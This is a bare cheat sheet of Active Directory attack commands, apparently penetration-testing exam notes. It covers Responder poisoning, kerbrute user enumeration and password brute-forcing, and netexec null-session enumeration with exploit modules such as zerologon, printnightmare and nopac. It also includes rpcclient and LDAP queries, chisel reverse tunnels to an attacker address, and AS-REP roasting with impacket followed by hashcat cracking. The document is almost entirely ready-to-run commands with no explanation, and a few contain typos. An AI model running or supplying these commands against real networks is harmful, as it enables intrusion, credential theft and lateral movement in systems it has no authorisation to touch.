```bash
sudo responder -I wlan0 -dwv
```

```bash
kerbrute userenum -d $domain /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc dc01.$domain

kerbrute bruteuser -d $domain ~/rockyou.txt w.smith
```

```bash
netexec smb <IP> -u '' -p '' --shares
netexec smb <IP> -u '' -p '' --users
netxec ldap <IP> -u '' -p '' --password-not-required --admin-count --users --groups
netexec smb <IP> -u '' -p '' --rid-brute
netexec smb <IP> -u '' -p '' -M spider_plus
netexec smb <IP> -u '' -p '' -M printnightmare
netexec smb <IP> -u '' -p '' -M gpp_password
netexec smb <IP> -u '' -p '' -M nopac
netexec smb <IP> -u '' -p '' -M zerologon
```

```bash
rpcclient -U '' -N <IP>
rpcclient -U "username%passwd" <IP>  
querydispinfo 
queryuser joe 
querygroup 0x44f       
querygroupmem 0x44f    
```

```bash
ldapsearch -H ldap://dc01.domain.com -D '' -w '' -b "dc=domain,dc=com"
ldapsearch -H ldap://dc01.domain.com -D '' -w '' -b "dc=offsec,dc=com" | grep -i description
```

```bash
.\chisel.exe client 192.168.45.x:8888 R:9999:socks
.\chisel.exe client 192.168.45.x:8888 8080:127.0.0.1:80
```

```bash
impacket-GetNPUsers -dc-ip <IP> -request  oscp.exam/-format hashcat
impacket-GetNPUsers oscp.exam/user -dc-ip <IP> -format hashcat

Impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 

hashcat -m 18200 crackme.txt ~/rockyou.txt -O -r ~/opt/wordlists/best64.rule -O
```
